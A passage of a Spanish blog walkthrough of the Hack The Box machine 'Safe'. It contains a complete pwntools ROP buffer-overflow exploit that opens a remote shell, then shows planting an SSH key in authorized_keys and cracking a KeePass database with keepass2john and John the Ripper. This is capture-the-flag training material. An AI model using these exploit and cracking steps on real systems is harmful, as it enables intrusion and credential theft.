<p>Sin embargo, hay un pequeño problema, en la siguiente instrucción, <code class="language-plaintext highlighter-rouge">0x401159</code>, se está efectuando un <em>jump</em> a <code class="language-plaintext highlighter-rouge">R13</code>, el cual apunta a una dirección que no nos interesa, por lo que también debemos de hallar una forma en la que inyectar la dirección en la que se efectúa la llamada al sistema, de modo que así, a la llamada al sistema, le estamos pasando como argumento nuestro código malicioso definido en <code class="language-plaintext highlighter-rouge">RDI</code>.</p>

<p>La pregunta ahora es, ¿de qué manera inyectamos la dirección de la llamada al sistema, en <code class="language-plaintext highlighter-rouge">R13</code>? Esto lo haremos haciendo uso de <code class="language-plaintext highlighter-rouge">gadgets</code>, los cuales no son más que instrucciones de la CPU, ya definidas dentro del programa.</p>

<p>Haciendo uso de nuestro script, escribiremos ahora <code class="language-plaintext highlighter-rouge">ropper</code>, lo cual nos permitirá listar todos los <code class="language-plaintext highlighter-rouge">gadgets</code> dentro del binario.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/25.png" alt="" /></p>

<p>Vemos que se nos lista un total de <em>99 gadgets</em>, de los cuales nos interesa <code class="language-plaintext highlighter-rouge">pop</code>, ya que este nos permite cargar un valor en el registro al que esté asignado, por lo que procederemos a listar que opciones tenemos con el <code class="language-plaintext highlighter-rouge">gadget pop</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper --search "pop"
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/26.png" alt="" /></p>

<p>Observamos, que tenemos una opción que nos permite hacer un <code class="language-plaintext highlighter-rouge">pop</code> a <code class="language-plaintext highlighter-rouge">R13</code>, aunque esta va seguida de <code class="language-plaintext highlighter-rouge">pops</code> a otras direcciones, por lo que a estas, tendremos que asignarles valores nulos, ya que no nos interesan.</p>

<p>Ya con toda esta información, es posible finalmente, explotar el binario <code class="language-plaintext highlighter-rouge">myapp</code>, haciendo uso de <code class="language-plaintext highlighter-rouge">Buffer Overflow</code>, <code class="language-plaintext highlighter-rouge">Return Oriented Programming</code> y <code class="language-plaintext highlighter-rouge">gadgets</code>, por lo que regresaremos a nuestro script en <code class="language-plaintext highlighter-rouge">Python</code>.</p>

<p>Lo primero que vamos a hacer, es comentar o borrar la línea en la que aplicábamos un <em>breakpoint</em> a la llamada al sistema, ya que no la vamos a usar más, esto mismo haremos con la línea del p.recvuntil(). Por otra parte, vamos a empezar por definir variables; la primera será <code class="language-plaintext highlighter-rouge">popR13</code>, la cual va a valer la dirección en la que se aplica este <code class="language-plaintext highlighter-rouge">gadget</code>; la segunda será <code class="language-plaintext highlighter-rouge">system</code>, la cual va a valer la dirección de la llamada al sistema; la tercera será <code class="language-plaintext highlighter-rouge">test</code>, la cual va a valer la dirección de la función <code class="language-plaintext highlighter-rouge">test</code>.</p>

<p>La dirección de la función <code class="language-plaintext highlighter-rouge">test</code>, la podemos sacar de <code class="language-plaintext highlighter-rouge">Ghidra</code>:</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/27.png" alt="" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">popR13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401206</span><span class="p">)</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40116e</span><span class="p">)</span>
<span class="n">test</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401152</span><span class="p">)</span>
</code></pre></div></div>

<p>Es importante tener en cuenta que, en todo momento, estamos trabajando en <code class="language-plaintext highlighter-rouge">64 bits</code>.</p>

<p>Por otra parte, vamos a empezar por definir el número de <em>letras A</em> que queremos introducir, previo a desbordar el <code class="language-plaintext highlighter-rouge">buffer</code>, esto lo vamos a almacenar en una variable de nombre <code class="language-plaintext highlighter-rouge">junk</code>, eso si, deberemos de codificar la variable en formato bytes.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">junk</span> <span class="o">=</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">112</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
</code></pre></div></div>

<p>Si nos percatamos, estamos introduciendo <em>112 letras A</em>, y no <em>120</em>, porque ciertamente el <code class="language-plaintext highlighter-rouge">buffer</code> se desborda con <em>112 bytes</em>, como pudimos ver con <code class="language-plaintext highlighter-rouge">Ghidra</code>, no obstante, para poder empezar a sobrescribir registros tenemos que introducir <em>120 bytes</em> como vimos con <code class="language-plaintext highlighter-rouge">GEF</code>, pues estamos frente a un <em>sistema operativo</em> de <code class="language-plaintext highlighter-rouge">64 bits</code>, por lo que necesitamos de <code class="language-plaintext highlighter-rouge">8 bytes</code> para insertar un valor en el <code class="language-plaintext highlighter-rouge">stack</code>, en caso de estar en un sistema operativo de <code class="language-plaintext highlighter-rouge">32 bits</code>, necesitaríamos de <code class="language-plaintext highlighter-rouge">4 bytes</code>.</p>

<p>Entonces, la variable <code class="language-plaintext highlighter-rouge">local_78</code> ciertamente tiene una longitud máxima de <em>112 bytes</em>, sin embargo, necesitamos de <em>8 bytes</em> más, para desbordar satisfactoriamente el <code class="language-plaintext highlighter-rouge">buffer</code>, de este modo, los bytes siguientes a 112 se estarían almacenando en el registro <code class="language-plaintext highlighter-rouge">RSP</code>, pero hasta que no introduzcamos como mínimo <em>120 bytes</em>, no vamos a conseguir un <code class="language-plaintext highlighter-rouge">Segmentation Fault</code>, razón por la cual, si al binario <code class="language-plaintext highlighter-rouge">myapp</code>, le pasamos una cadena ya sea de 113, 114, 115, 116 117, 118 o 119 bytes, conseguiremos una salida exitosa.</p>

<p>Lo que nos interesa ahora, es sobrescribir el registro <code class="language-plaintext highlighter-rouge">RSP</code> con nuestro código malicioso, de modo que este pase al registro <code class="language-plaintext highlighter-rouge">RSI</code>, de modo que cuando se ejecute la función <code class="language-plaintext highlighter-rouge">jump</code> hacia la dirección de la llamada al sistema, nos ejecute nuestro código.</p>

<p>Concretamente vamos a ejecutar el comando <code class="language-plaintext highlighter-rouge">/bin/sh</code> en adición de un <code class="language-plaintext highlighter-rouge">null byte</code> por si nos da problemas, la longitud total de esta cadena es de <em>8 bytes</em>, (7 en <code class="language-plaintext highlighter-rouge">/bin/sh</code>, más el del <code class="language-plaintext highlighter-rouge">null byte</code>) por lo que estaríamos desbordando el <code class="language-plaintext highlighter-rouge">buffer</code>, e ingresando esta cadena en el registro <code class="language-plaintext highlighter-rouge">RSP</code>.</p>

<p>La siguiente variable por definir será <code class="language-plaintext highlighter-rouge">binSh</code>, la cual, como mencionamos, valdrá el comando <code class="language-plaintext highlighter-rouge">/bin/sh</code> en adición de un <code class="language-plaintext highlighter-rouge">null byte</code>, y al igual que la variable <code class="language-plaintext highlighter-rouge">junk</code>, deberemos codificarla; la última variable que definiremos será, <code class="language-plaintext highlighter-rouge">nullByte</code>, la cual usaremos para asignar valores nulos a las direcciones <code class="language-plaintext highlighter-rouge">R14</code> y <code class="language-plaintext highlighter-rouge">R15</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">binSH</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">nullByte</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
</code></pre></div></div>

<p>Ya para finalizar, debemos indicar la cadena de caracteres que queremos enviar, después de que se nos pregunte <em>What do you want me to echo back?</em>, para hacer esto tendremos que hacer uso de <code class="language-plaintext highlighter-rouge">p.sendline()</code>, dentro del cual indicaremos las variables que acabamos de definir, en su respectivo orden.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">binSH</span> <span class="o">+</span> <span class="n">popR13</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="n">null</span> <span class="o">+</span> <span class="n">null</span> <span class="o">+</span> <span class="n">test</span><span class="p">)</span>
</code></pre></div></div>

<p>En primer lugar estamos introduciendo una cadena de <em>112 bytes</em>, posteriormente introducimos nuestro código malicioso que suma una longitud de <em>8 bytes</em>, de modo que estaríamos ya, sobrescribiendo el registro <code class="language-plaintext highlighter-rouge">RSP</code>, que se convertirá en <code class="language-plaintext highlighter-rouge">RSI</code>, posteriormente, haremos una llamada al <code class="language-plaintext highlighter-rouge">gadget pop</code>, al cual le pasaremos como argumentos lo que nos solicita, la dirección de <code class="language-plaintext highlighter-rouge">R13</code>, <code class="language-plaintext highlighter-rouge">R14</code>, <code class="language-plaintext highlighter-rouge">R15</code> y <code class="language-plaintext highlighter-rouge">RET</code>, los cuales valdrán la dirección de la llamada al sistema, valor nulo, valor nulo y como función de regreso, la dirección de la función <code class="language-plaintext highlighter-rouge">test</code>, redirigiendo así, el flujo del programa a través de esa función.</p>

<p>Ya lo que nos quedaría, sería ejecutar nuestro script, no de manera local, pero remota, para lo cual debemos introducir la dirección IP de la máquina víctima, e indicar el puerto a través del cual nos queremos conectar.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.147"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
</code></pre></div></div>

<p>Así mismo, es necesario especificar que queremos interactuar con la consola que estamos consiguiendo, para lo cual deberemos indicar lo siguiente:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Nuestro script, debería verse algo así:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'gnome-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">]</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>

<span class="c1"># p = gdb.debug('/ubicación/del/binario/myapp', 'b *0x40116e')
# p.recvuntil("What do you want me to echo back?")
</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.147"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>

<span class="n">popR13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401206</span><span class="p">)</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40116e</span><span class="p">)</span>
<span class="n">test</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401152</span><span class="p">)</span>
 
<span class="n">junk</span> <span class="o">=</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">112</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
  
<span class="n">binSh</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
  
<span class="n">nullByte</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">binSh</span> <span class="o">+</span> <span class="n">popR13</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="n">nullByte</span> <span class="o">+</span> <span class="n">nullByte</span> <span class="o">+</span> <span class="n">test</span><span class="p">)</span>
  
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Al ejecutar nuestro script, lo que vamos a conseguir es una consola, por lo que una vez dentro del sistema, podríamos listar la flag del usuario con bajos privilegios.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -name user.txt 2&gt; /dev/null
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/28.png" alt="" /></p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p>Para conseguir la flag del usuario con máximos privilegios, podemos emepezar por listar el contenido dentro de la carpeta del usuario user.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/29.png" alt="" /></p>

<p>Nos vamos a encontrar con una serie de imágenes, en adición de un archivo de extensión <code class="language-plaintext highlighter-rouge">.kdbx</code>, el cual guarda relación con el gestor de contraseñas KeePass. Debido a que nos encontramos en una máquina remota, no podremos visualizar las imágenes alojadas dentro de la máquina víctima, por lo que tenemos que buscar una forma de transferirlas a nuestro equipo.</p>

<p>Si recordamos, el puerto 22 estaba abierto, por lo que podríamos conectarnos por <code class="language-plaintext highlighter-rouge">SSH</code> a la máquina remota, no obstante, ¿cómo nos vamos a conectar sin proporcionar credenciales? Esto lo haremos introduciendo nuestra clave pública, dentro de un archivo de nombre <code class="language-plaintext highlighter-rouge">authorized_keys</code> ubicado en la carpeta <code class="language-plaintext highlighter-rouge">.ssh</code>, dentro del directorio del usuario user.</p>

<p>Lo primero que haremos será crear un par de claves <code class="language-plaintext highlighter-rouge">SSH</code>, una pública, y una privda, esto lo haremos haciendo uso de <code class="language-plaintext highlighter-rouge">ssh-key</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd ~/.ssh/
ssh-keygen
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/30.png" alt="" /></p>

<p>En caso de querer ingresar algún tipo de contraseña, se lo puede hacer. Ya teniendo el par de claves <code class="language-plaintext highlighter-rouge">SSH</code>, vamos a copiar el contenido de nuestra clave pública, para posteiormente añadirla en la ruta <code class="language-plaintext highlighter-rouge">/home/user/.ssh/authorized_keys</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "nuestraClavePública" &gt;&gt; /home/user/.ssh/authorized_keys
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/31.png" alt="" /></p>

<p>Una vez hecho esto, podemos conectarnos a través de <code class="language-plaintext highlighter-rouge">SSH</code> a la máquina víctima.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh user@10.10.10.147
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/32.png" alt="" /></p>

<p>En vista de que estamos conectados a la máquina vía <code class="language-plaintext highlighter-rouge">SSH</code>, podríamos intentar transferir los archivos del directorio <code class="language-plaintext highlighter-rouge">/home/user/</code>, haciendo uso de <code class="language-plaintext highlighter-rouge">SCP</code> (<em>Secure Copy Protocol</em>), aunque también pudimos haberlo hecho creando un servidor en la máquina remota mediante <code class="language-plaintext highlighter-rouge">Busybox</code>, y posteriormente, descargando las imágnes a través de <code class="language-plaintext highlighter-rouge">Wget</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp "user@10.10.10.147:/home/user/*" .
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/33.png" alt="" /></p>

<p>Una vez tengamos tanto las imágenes como el archivo <code class="language-plaintext highlighter-rouge">MyPasswords.kdbx</code> en nuestro equipo, podemos empezar a analizar que hacer con ello; dudo mucho que las imágenes tengan algo que ver con <code class="language-plaintext highlighter-rouge">esteganografía</code>, ya que si abrimos el archivo <code class="language-plaintext highlighter-rouge">MyPasswords.kdbx</code> con <code class="language-plaintext highlighter-rouge">keepassxc</code>, nos pregunta por un archivo clave.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/34.png" alt="" /></p>

<p>En caso de no contar con <code class="language-plaintext highlighter-rouge">keepassxc</code> instalado, podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install keepassxc
</code></pre></div></div>

<p>Ya en este punto, lo que se nos podría ocurrir sería intentar aplicar fuerza bruta sobre el archivo <code class="language-plaintext highlighter-rouge">MyPasswords.kdbx</code>, no obstante, primero tendremos que pasar de formato <code class="language-plaintext highlighter-rouge">KeePass</code>, a formato <code class="language-plaintext highlighter-rouge">john</code>, para crackear la contraseña haciendo uso de <code class="language-plaintext highlighter-rouge">John the Ripper</code>, de modo que usaremos  <code class="language-plaintext highlighter-rouge">keepass2john</code>.</p>

<p>Antes de hacerlo hay que recordar que las imágenes están por algo, para lo cual se las pasaremos como argumento a <code class="language-plaintext highlighter-rouge">keepass2john</code>, mediante el parámetro <code class="language-plaintext highlighter-rouge">-k</code>. Esto se vería algo así:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>keepass2john <span class="nt">-k</span> &lt;imagenDeseada&gt; MyPasswords.kdbx
</code></pre></div></div>

<p>Esto va a hacer el trabajo, pero podemos reducir tiempo automatizándolo, para ello haremos uso de un <em>bucle for</em>, para ir iterando sobre cada imagen.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>image <span class="k">in</span> <span class="si">$(</span><span class="nb">echo</span> <span class="s2">"IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG"</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span>keepass2john <span class="nt">-k</span> <span class="nv">$image</span> MyPasswords.kdbx<span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/35.png" alt="" /></p>

<p>Utilizar el comando anterior nos sirve, sin embargo, si lo pensamos un poco, si redirigimos este ouput a un fichero hashes.txt, por ejemplo, al cual luego le aplicaremos <code class="language-plaintext highlighter-rouge">john</code>, cuando este encuentre la contraseña, nos dirá que la imágen que utilizó fue <em>MyPasswords</em>, lo cual no nos es de ayuda, por lo que podemos reemplazar <em>MyPasswords</em>, por el nombre de la imagen.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>image <span class="k">in</span> <span class="si">$(</span><span class="nb">echo</span> <span class="s2">"IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG"</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span>keepass2john <span class="nt">-k</span> <span class="nv">$image</span> MyPasswords.kdbx | <span class="nb">sed</span> <span class="s2">"s/MyPasswords/</span><span class="nv">$image</span><span class="s2">/"</span><span class="p">;</span> <span class="k">done</span> <span class="o">&gt;&gt;</span> nombreArchivo
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/36.png" alt="" /></p>

<p>Finalmente, para crackear la contraseña, haremos uso de <code class="language-plaintext highlighter-rouge">john</code> en conjunto del diccionario <a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220209T031834Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&amp;X-Amz-SignedHeaders=host&amp;actor_id=79855501&amp;key_id=0&amp;repo_id=97553311&amp;response-content-disposition=attachment%3B%20filename%3Drockyou.txt&amp;response-content-type=application%2Foctet-stream">rockyou.txt</a>.</p>

<p>En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install john
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo john --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/37.png" alt="" /></p>

<p>Una vez conseguimos tanto la contraseña como el archivo clave, ya podremos abrir el archivo <code class="language-plaintext highlighter-rouge">MyPasswords.kdbx</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/38.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/39.png" alt="" /></p>

<p>Y ya con la contraseña del usuario root en nuestro poder, podremos listar la última flag.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/40.png" alt="" /></p>

</article>

      </section>
    </div>
  </div>

   <footer>
  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
    <span>
        <b>m4teo</b>
    </span>
    
    <span>© 2022</span>
  </a>
</footer>


  
    <script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-219710333-2', 'auto');
  ga('send', 'pageview');
</script>
  
</body>

</html>